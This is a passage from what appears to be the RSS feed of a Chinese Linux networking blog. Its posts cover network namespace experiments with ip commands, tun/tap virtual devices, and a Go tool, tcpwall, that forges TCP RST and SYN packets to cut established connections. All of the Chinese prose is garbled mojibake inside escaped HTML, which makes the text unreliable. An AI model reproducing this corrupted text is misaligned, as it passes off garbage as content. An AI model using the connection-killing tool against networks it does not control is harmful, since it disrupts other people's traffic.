ˆï¼Œè¿™å…¶ä¸­ä¾¿åŒ…æ‹¬äº†ç½‘ç»œæ¥å£ï¼ˆç½‘å¡ï¼‰ï¼Œè·¯ç”±è¡¨ï¼Œiptablesè§„åˆ™ç­‰ã€‚ä¾‹å¦‚å¤§åé¼é¼çš„dockerä¾¿æ˜¯åŸºäºnetnså®ç°çš„ç½‘ç»œéš”ç¦»ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥æ‰‹åŠ¨å®éªŒä¸€ä¸‹netnsçš„éš”ç¦»ç‰¹æ€§ã€‚&lt;/p>
&lt;h3 id="ä½¿ç”¨æ–¹å¼">ä½¿ç”¨æ–¹å¼&lt;/h3>
&lt;p>ä½¿ç”¨&lt;code>ip netns help&lt;/code>æŸ¥çœ‹ä½¿ç”¨å¸®åŠ©&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Usage: ip netns list
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns add NAME
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> NAME NETNSID
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#ff79c6">[&lt;/span>-all&lt;span style="color:#ff79c6">]&lt;/span> netns delete &lt;span style="color:#ff79c6">[&lt;/span>NAME&lt;span style="color:#ff79c6">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns identify &lt;span style="color:#ff79c6">[&lt;/span>PID&lt;span style="color:#ff79c6">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns pids NAME
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#ff79c6">[&lt;/span>-all&lt;span style="color:#ff79c6">]&lt;/span> netns &lt;span style="color:#8be9fd;font-style:italic">exec&lt;/span> &lt;span style="color:#ff79c6">[&lt;/span>NAME&lt;span style="color:#ff79c6">]&lt;/span> cmd ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns monitor
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip netns list-id
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="å¼€å§‹å®éªŒ">å¼€å§‹å®éªŒ&lt;/h3>
&lt;p>æˆ‘ä»¬å°†è¦æ„å»ºå¦‚ä¸‹å›¾çš„ç½‘ç»œ&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/netns.png?t=2" alt="https://oss.typesafe.cn/netns.png">&lt;/p>
&lt;p>é¦–å…ˆæˆ‘ä»¬æ·»åŠ ä¸¤ä¸ªtapè®¾å¤‡å¹¶é…ç½®ä¸ŠIPä¿¡æ¯ï¼Œç„¶åæ·»åŠ ä¸¤ä¸ªnetnsï¼Œæœ€åå°†tapè®¾å¤‡ç§»åŠ¨åˆ°netnsä¸­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># æ·»åŠ å¹¶å¯åŠ¨è™šæ‹Ÿç½‘å¡tapè®¾å¤‡&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip tuntap add dev tap0 mode tap 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip tuntap add dev tap1 mode tap 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> tap0 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> tap1 up
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># é…ç½®IP&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip addr add 10.0.0.1/24 dev tap0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip addr add 10.0.0.2/24 dev tap1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># æ·»åŠ netns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip netns add ns1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># å°†è™šæ‹Ÿç½‘å¡tap0ï¼Œtap1åˆ†åˆ«ç§»åŠ¨åˆ°ns0å’Œns1ä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> tap0 netns ns0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ip link &lt;span style="color:#8be9fd;font-style:italic">set&lt;/span> tap1 netns ns1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨å®¿ä¸»æœºå™¨ä¸Šä½¿ç”¨&lt;code>ping 10.0.0.1&lt;/code>æµ‹è¯•ä¸tap0çš„ç½‘ç»œè¿é€šæ€§&lt;/p></description></item><item><title>æ·±å…¥ç†è§£ Linux è™šæ‹Ÿç½‘ç»œè®¾å¤‡ tun/tap</title><link>https://www.typesafe.cn/posts/linux-tun-tap/</link><pubDate>Sun, 08 Nov 2020 22:11:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-tun-tap/</guid><description>&lt;p>åœ¨æ¢ç´¢Linuxç½‘ç»œè™šæ‹ŸåŒ–çš„ä¸–ç•Œæ—¶ï¼Œä½ ä¸€å®šä¼šé‡åˆ°tunå’Œtapè¿™ä¸¤ä¸ªå…³é”®æ¦‚å¿µã€‚å®ƒä»¬æ˜¯ç†è§£VPNã€è™šæ‹Ÿæœºç½‘ç»œã€å®¹å™¨ç½‘ç»œç­‰æŠ€æœ¯çš„åŸºç¡€ã€‚æœ¬æ–‡å°†å¸¦ä½ æ·±å…¥äº†è§£tun/tapæ˜¯ä»€ä¹ˆï¼Œå®ƒä»¬æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œä»¥åŠå¦‚ä½•åœ¨å®è·µä¸­ä½¿ç”¨å®ƒä»¬ã€‚&lt;/p>
&lt;blockquote>
&lt;p>åœ¨è®¡ç®—æœºç½‘ç»œä¸­ï¼Œ&lt;strong>tun&lt;/strong>ä¸&lt;strong>tap&lt;/strong>æ˜¯æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ã€‚ä¸åŒäºæ™®é€šé ç¡¬ä»¶ç½‘ç»œé€‚é…å™¨å®ç°çš„è®¾å¤‡ï¼Œè¿™äº›è™šæ‹Ÿçš„ç½‘ç»œè®¾å¤‡å…¨éƒ¨ç”¨è½¯ä»¶å®ç°ï¼Œå¹¶å‘è¿è¡Œäºæ“ä½œç³»ç»Ÿä¸Šçš„è½¯ä»¶æä¾›ä¸ç¡¬ä»¶çš„ç½‘ç»œè®¾å¤‡å®Œå…¨ç›¸åŒçš„åŠŸèƒ½ã€‚&lt;/p>&lt;/blockquote>
&lt;h3 id="tuntapæ˜¯ä»€ä¹ˆ">tun/tapæ˜¯ä»€ä¹ˆï¼Ÿ&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>tun&lt;/strong> (tunnelçš„ç¼©å†™) æ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„ç‚¹å¯¹ç‚¹ç½‘ç»œè®¾å¤‡ï¼Œå·¥ä½œåœ¨ç½‘ç»œå±‚ï¼ˆOSIæ¨¡å‹çš„ç¬¬ä¸‰å±‚ï¼‰ã€‚å®ƒå¤„ç†çš„æ˜¯IPæ•°æ®åŒ…ï¼Œæ‰€ä»¥ä½ å¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„ç½‘å¡ï¼Œä½†å®ƒæ²¡æœ‰ç‰©ç†çš„MACåœ°å€ã€‚tunè®¾å¤‡å¸¸ç”¨äºå®ç°å„ç§IPéš§é“ï¼Œä¾‹å¦‚OpenVPNå’ŒIPSecã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>tap&lt;/strong> (network tapçš„ç¼©å†™) æ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„ä»¥å¤ªç½‘è®¾å¤‡ï¼Œå·¥ä½œåœ¨æ•°æ®é“¾è·¯å±‚ï¼ˆOSIæ¨¡å‹çš„ç¬¬äºŒå±‚ï¼‰ã€‚å®ƒå¤„ç†çš„æ˜¯ä»¥å¤ªç½‘å¸§ï¼Œå› æ­¤å®ƒæ‹¥æœ‰ä¸€ä¸ªMACåœ°å€ï¼Œè¡Œä¸ºä¸Šæ›´åƒä¸€ä¸ªçœŸå®çš„ä»¥å¤ªç½‘å¡ã€‚tapè®¾å¤‡æœ€å¸¸è§çš„ç”¨é€”æ˜¯ä½œä¸ºè™šæ‹Ÿæœºçš„ç½‘å¡ï¼ˆå¦‚QEMU/KVMï¼‰ï¼Œæˆ–è€…ç”¨äºåˆ›å»ºç½‘ç»œæ¡¥æ¥ï¼Œå°†è™šæ‹Ÿæœºæ¥å…¥ç‰©ç†å±€åŸŸç½‘ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="tuntap-çš„å·¥ä½œåŸç†">tun/tap çš„å·¥ä½œåŸç†&lt;/h3>
&lt;p>Linuxä¸­çš„tun/tapè®¾å¤‡æä¾›äº†ä¸€ç§èƒ½åŠ›ï¼Œè®©ç”¨æˆ·ç©ºé—´çš„åº”ç”¨ç¨‹åºèƒ½å¤Ÿåƒè¯»å†™æ–‡ä»¶ä¸€æ ·ï¼Œç›´æ¥å‘å†…æ ¸ç½‘ç»œåè®®æ ˆæ³¨å…¥æ•°æ®åŒ…ï¼Œæˆ–è€…ä»åè®®æ ˆä¸­æ¥æ”¶æ•°æ®åŒ…ã€‚&lt;/p>
&lt;p>æ“ä½œtun/tapè®¾å¤‡ä¸»è¦é€šè¿‡ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦è®¾å¤‡æ–‡ä»¶ &lt;code>/dev/net/tun&lt;/code>ã€‚å½“ä¸€ä¸ªåº”ç”¨ç¨‹åºæ‰“å¼€è¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œå†…æ ¸ä¼šåˆ›å»ºä¸€ä¸ªä¸è¯¥æ–‡ä»¶æè¿°ç¬¦å…³è”çš„è™šæ‹Ÿç½‘ç»œæ¥å£ï¼ˆå¦‚ &lt;code>tun0&lt;/code> æˆ– &lt;code>tap0&lt;/code>ï¼‰ã€‚&lt;/p>
&lt;p>æ•°æ®æµåŠ¨çš„è¿‡ç¨‹å¯ä»¥ç”¨ä¸‹å›¾æ¥æ¦‚æ‹¬ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-mermaid" data-lang="mermaid">graph TD
 subgraph &amp;#34;ç”¨æˆ·ç©ºé—´ (User Space)&amp;#34;
 App(&amp;#34;åº”ç”¨ç¨‹åº (e.g., VPN, QEMU)&amp;#34;)
 end

 subgraph &amp;#34;å†…æ ¸ç©ºé—´ (Kernel Space)&amp;#34;
 DevFile(&amp;#34;/dev/net/tun&amp;#34;)
 Driver(&amp;#34;TUN/TAP é©±åŠ¨&amp;#34;)
 NetStack(&amp;#34;ç½‘ç»œåè®®æ ˆ&amp;#34;)
 PhyDriver(&amp;#34;ç‰©ç†ç½‘å¡é©±åŠ¨&amp;#34;)
 end
 
 PHY(&amp;#34;ç‰©ç†ç½‘å¡&amp;#34;)

 App &amp;lt;--&amp;gt;|ç»ç”±æ–‡ä»¶æè¿°ç¬¦&amp;lt;br/&amp;gt;read()/write()| DevFile
 DevFile &amp;lt;--&amp;gt; Driver
 Driver &amp;lt;--&amp;gt; NetStack
 NetStack &amp;lt;--&amp;gt; PhyDriver
 PhyDriver &amp;lt;--&amp;gt; PHY
&lt;/code>&lt;/pre>&lt;p>&lt;strong>æ•°æ®å‘é€æµç¨‹ (Outbound):&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>ç”¨æˆ·ç©ºé—´çš„åº”ç”¨ç¨‹åºï¼ˆä¾‹å¦‚VPNå®¢æˆ·ç«¯ï¼‰é€šè¿‡æ–‡ä»¶æè¿°ç¬¦å‘ &lt;code>/dev/net/tun&lt;/code> å†™å…¥ä¸€ä¸ªIPåŒ…ï¼ˆå¯¹äºtunè®¾å¤‡ï¼‰æˆ–ä»¥å¤ªç½‘å¸§ï¼ˆå¯¹äºtapè®¾å¤‡ï¼‰ã€‚&lt;/li>
&lt;li>tun/tapé©±åŠ¨æ¥æ”¶åˆ°æ•°æ®ï¼Œå¹¶å°†å…¶ä½œä¸ºä¸€ä¸ªæ•°æ®åŒ…æ³¨å…¥åˆ°å†…æ ¸ç½‘ç»œåè®®æ ˆä¸­ï¼Œå°±åƒæ•°æ®æ˜¯ä»ä¸€ä¸ªçœŸå®çš„ç‰©ç†ç½‘å¡ä¼ æ¥ä¸€æ ·ã€‚&lt;/li>
&lt;li>ç½‘ç»œåè®®æ ˆæ ¹æ®å…¶è·¯ç”±è¡¨ç­‰ä¿¡æ¯å¯¹æ•°æ®åŒ…è¿›è¡Œå¤„ç†ï¼ˆä¾‹å¦‚ï¼Œè·¯ç”±é€‰æ‹©ã€NATè½¬æ¢ï¼‰ã€‚&lt;/li>
&lt;li>æœ€ç»ˆï¼Œåè®®æ ˆå°†æ•°æ®åŒ…é€šè¿‡çœŸå®çš„ç‰©ç†ç½‘å¡å‘é€å‡ºå»ã€‚&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>æ•°æ®æ¥æ”¶æµç¨‹ (Inbound):&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>ç‰©ç†ç½‘å¡æ¥æ”¶åˆ°ä¸€ä¸ªæ•°æ®åŒ…ã€‚&lt;/li>
&lt;li>å†…æ ¸ç½‘ç»œåè®®æ ˆå¤„ç†è¿™ä¸ªæ•°æ®åŒ…ã€‚&lt;/li>
&lt;li>å¦‚æœè·¯ç”±è§„åˆ™æŒ‡ç¤ºè¿™ä¸ªæ•°æ®åŒ…åº”è¯¥è¢«å‘é€åˆ°tun/tapè™šæ‹Ÿæ¥å£ï¼Œåè®®æ ˆå°±ä¼šå°†å®ƒäº¤ç»™tun/tapé©±åŠ¨ã€‚&lt;/li>
&lt;li>é©±åŠ¨ç¨‹åºå°†è¯¥æ•°æ®åŒ…æ”¾å…¥ä¸€ä¸ªé˜Ÿåˆ—ï¼Œç­‰å¾…ç”¨æˆ·ç©ºé—´çš„åº”ç”¨ç¨‹åºé€šè¿‡æ–‡ä»¶æè¿°ç¬¦ä» &lt;code>/dev/net/tun&lt;/code> ä¸­è¯»å–ã€‚&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>&lt;strong>æ³¨æ„&lt;/strong>ï¼šå½“åº”ç”¨ç¨‹åºå…³é—­è¯¥æ–‡ä»¶æè¿°ç¬¦æ—¶ï¼Œå¯¹åº”çš„è™šæ‹Ÿç½‘ç»œæ¥å£ä»¥åŠç›¸å…³çš„è·¯ç”±ç­‰ä¿¡æ¯ä¹Ÿä¼šè¢«å†…æ ¸è‡ªåŠ¨åˆ é™¤ã€‚&lt;/p></description></item><item><title>tcpkillåœ¨goè¯­è¨€ä¸‹çš„å®ç°å’Œå¢å¼º</title><link>https://www.typesafe.cn/posts/tcpwall/</link><pubDate>Sat, 31 Oct 2020 00:00:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/tcpwall/</guid><description>&lt;h2 id="tcpwall">tcpwall&lt;/h2>
&lt;p>å½“æˆ‘ä»¬æƒ³è¦é˜»æ­¢æŸäº›TCPè¿æ¥çš„å»ºç«‹ï¼Œåœ¨Linuxå¹³å°ä¸Šæœ‰ä¸€ä¸ªå¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆ&lt;strong>iptables&lt;/strong>ï¼Œä½†æ˜¯å¯¹é‚£äº›å·²ç»å»ºç«‹çš„tcpè¿æ¥ï¼Œiptableså°±ä¸èƒ½åšåˆ°éšå¿ƒæ‰€æ¬²çš„é˜»æ–­äº†ã€‚&lt;/p>
&lt;p>æˆ‘åœ¨äº’è”ç½‘ä¸Šæ£€ç´¢çš„æ—¶å€™å‘ç°äº†&lt;strong>tcpkill&lt;/strong>è¿™ä¸ªå·¥å…·ï¼Œtcpkillæ˜¯ä¸€ä¸ªç½‘ç»œåˆ†æå·¥å…·é›†&lt;strong>dsniff&lt;/strong>ä¸­çš„ä¸€ä¸ªå°å·¥å…·ã€‚åœ¨Linuxä¸Šå¯ä»¥ç›´æ¥é€šè¿‡dsniffåŒ…å®‰è£…ï¼Œä½¿ç”¨æ–¹å¼ä¹Ÿéå¸¸ç®€å•ã€‚&lt;/p>
&lt;p>é€šè¿‡æµ‹è¯•æˆ‘å‘ç°tcpkillåœ¨æ‰§è¡Œå‘½ä»¤ä¹‹åå¹¶ä¸ä¼šç«‹åˆ»é˜»æ–­tcpè¿æ¥ï¼Œè€Œæ˜¯ç­‰å¾…æœ‰æ•°æ®ä¼ è¾“æ—¶ï¼Œæ‰ä¼šé˜»æ–­ï¼Œå› æ­¤åœ¨æ‰§è¡Œå®Œå‘½ä»¤ä¹‹åç¨‹åºå¹¶ä¸ä¼šä¸»åŠ¨é€€å‡ºï¼Œè€Œæ˜¯éœ€è¦é€šè¿‡&lt;em>&lt;strong>Ctrl+C&lt;/strong>&lt;/em>æ¥é€€å‡ºï¼Œè¿™å¯¹äºæŸäº›æƒ³è¦é€šè¿‡ç¨‹åºæ¥è°ƒç”¨çš„è„šæœ¬å°å­ï¼ˆä¾‹å¦‚æˆ‘ï¼‰æ¥è¯´ç®€ç›´æ˜¯ä¸ªç¾éš¾ã€‚&lt;/p>
&lt;h2 id="å¦‚ä½•é˜»æ–­ä¸€ä¸ªå·²ç»å»ºç«‹çš„tcpè¿æ¥">å¦‚ä½•é˜»æ–­ä¸€ä¸ªå·²ç»å»ºç«‹çš„tcpè¿æ¥ï¼Ÿ&lt;/h2>
&lt;p>é˜»æ–­ä¸€ä¸ªå·²ç»å»ºç«‹çš„tcpè¿æ¥é€šå¸¸æœ‰è¿™å‡ ç§æ–¹æ¡ˆï¼š&lt;/p>
&lt;ol>
&lt;li>æœåŠ¡ç«¯ä¸»åŠ¨æ–­å¼€&lt;/li>
&lt;li>å®¢æˆ·ç«¯ä¸»åŠ¨æ–­å¼€&lt;/li>
&lt;li>æ‹”æ‰ç½‘çº¿ï¼ˆæ—¶é—´è¦è¶…è¿‡tcpè¶…æ—¶æ—¶é—´ï¼‰&lt;/li>
&lt;li>ä¼ªé€ RSTæ•°æ®åŒ…å‘é€ç»™æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯è®©å®ƒä»¬ä¸»åŠ¨æ–­å¼€ï¼ˆtcpkillå°±æ˜¯è¿™ä¹ˆåšçš„ï¼‰&lt;/li>
&lt;/ol>
&lt;p>å‰ä¸‰ç§å±€é™æ€§å¤ªå¤§ï¼Œåªèƒ½ç”¨ç¬¬4ç§äº†ã€‚&lt;/p>
&lt;h2 id="å¦‚ä½•å®ç°ä¼ªé€ rstæ•°æ®æŠ¥æ–‡åŒ…">å¦‚ä½•å®ç°ä¼ªé€ RSTæ•°æ®æŠ¥æ–‡åŒ…ï¼Ÿ&lt;/h2>
&lt;p>&lt;a href="https://github.com/google/gopacket">GoPacket&lt;/a> æ˜¯goåŸºäº&lt;strong>libpcap&lt;/strong>æ„å»ºçš„ä¸€ä¸ªåº“ï¼Œå¯ä»¥é€šè¿‡æ—è·¯çš„æ–¹å¼æ¥æ”¶ä¸€ä»½æ•°æ®åŒ…çš„æ‹·è´ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿æ•è·åˆ°æ­£åœ¨é€šä¿¡çš„tcpæ•°æ®æŠ¥æ–‡ã€‚é€šè¿‡æ•°æ®æŠ¥æ–‡ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°é€šä¿¡åŒæ–¹çš„MACåœ°å€ï¼ŒIPå’Œç«¯å£å·ï¼Œä»¥åŠACKå·ç­‰ï¼Œè¿™äº›éƒ½æ˜¯ä¼ªé€ æ•°æ®åŒ…å¿…ä¸å¯å°‘çš„ã€‚&lt;/p>
&lt;p>åœ¨å­¦ä¹ äº†&lt;strong>tcpkill&lt;/strong>çš„æºç ä¹‹åï¼Œæˆ‘ä½¿ç”¨goå¼€å‘äº†ä¸€ä¸ªå¢å¼ºç‰ˆçš„&lt;strong>tcpwall&lt;/strong>ï¼Œ&lt;strong>tcpwall&lt;/strong>ä¸ä»…å¯ä»¥å®ç°å’Œ&lt;strong>tcpkill&lt;/strong>åŒæ ·çš„åŸºäºipæˆ–ç«¯å£ç›‘å¬åˆ°æŒ‡å®šæ•°æ®æŠ¥æ–‡ä¹‹åä¼ªé€ RSTæ•°æ®æŠ¥æ–‡æ¥é˜»æ–­tcpè¿æ¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æºipæºç«¯å£ï¼Œç›®çš„ipç›®çš„ç«¯å£æ¥ä¸»åŠ¨å‘é€SYNæ•°æ®æŠ¥æ–‡åŒ…æ¥è¯±å¯¼é‚£äº›æ²¡æœ‰æ•°æ®çš„tcpè¿æ¥å‘é€ACKæ•°æ®æŠ¥æ–‡åŒ…ä»¥è·å–æºMACã€ç›®çš„MACå’ŒACKå·ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡æŒ‡å®šå‚æ•°è®©ç¨‹åºç­‰å¾…ä¸€æ®µæ—¶é—´åä¸»åŠ¨é€€å‡ºã€‚&lt;/p>
&lt;h2 id="å¦‚ä½•ä½¿ç”¨">å¦‚ä½•ä½¿ç”¨&lt;/h2>
&lt;p>é˜»æ–­æŒ‡å®šIPå’Œç«¯å£çš„TCPè¿æ¥ï¼ˆä¸å…³å¿ƒæ˜¯æºæˆ–è€…ç›®çš„ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>tcpwall -i &lt;span style="color:#ff79c6">{&lt;/span>interface&lt;span style="color:#ff79c6">}&lt;/span> -host &lt;span style="color:#ff79c6">{&lt;/span>host&lt;span style="color:#ff79c6">}&lt;/span> -port &lt;span style="color:#ff79c6">{&lt;/span>port&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>é˜»æ–­æŒ‡å®šæºIPå’Œæºç«¯å£çš„TCPè¿æ¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>tcpwall -i &lt;span style="color:#ff79c6">{&lt;/span>interface&lt;span style="color:#ff79c6">}&lt;/span> -shost &lt;span style="color:#ff79c6">{&lt;/span>src_host&lt;span style="color:#ff79c6">}&lt;/span> -sport &lt;span style="color:#ff79c6">{&lt;/span>src_port&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>é˜»æ–­æŒ‡å®šç›®çš„IPå’Œç›®çš„ç«¯å£çš„TCPè¿æ¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>tcpwall -i &lt;span style="color:#ff79c6">{&lt;/span>interface&lt;span style="color:#ff79c6">}&lt;/span> -dhost &lt;span style="color:#ff79c6">{&lt;/span>dst_host&lt;span style="color:#ff79c6">}&lt;/span> -dport &lt;span style="color:#ff79c6">{&lt;/span>dst_port&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>é˜»æ–­æŒ‡å®šæºIPã€æºç«¯å£ã€ç›®çš„IPã€ç›®çš„ç«¯å£çš„TCPè¿æ¥ï¼ˆä¼šä¸»åŠ¨å‘åŒæ–¹å‘é€SYNæ•°æ®æŠ¥æ–‡åŒ…ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>tcpwall -i &lt;span style="color:#ff79c6">{&lt;/span>interface&lt;span style="color:#ff79c6">}&lt;/span> -shost &lt;span style="color:#ff79c6">{&lt;/span>src_host&lt;span style="color:#ff79c6">}&lt;/span> -sport &lt;span style="color:#ff79c6">{&lt;/span>src_port&lt;span style="color:#ff79c6">}&lt;/span> -dhost &lt;span style="color:#ff79c6">{&lt;/span>dst_host&lt;span style="color:#ff79c6">}&lt;/span> -dport &lt;span style="color:#ff79c6">{&lt;/span>dst_port&lt;span style="color:#ff79c6">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="å…¶ä»–">å…¶ä»–&lt;/h2>
&lt;ul>
&lt;li>-timeout æ—¶é—´ï¼ˆç§’ï¼‰æŒ‡å®šç­‰å¾…å¤šä¹…ä¹‹åé€€å‡ºç¨‹åº&lt;/li>
&lt;/ul>
&lt;p>é¡¹ç›®åœ°å€ &lt;a href="https://github.com/dushixiang/tcpwall">https://github.com/dushixiang/tcpwall&lt;/a>&lt;/p></description></item></channel></rss>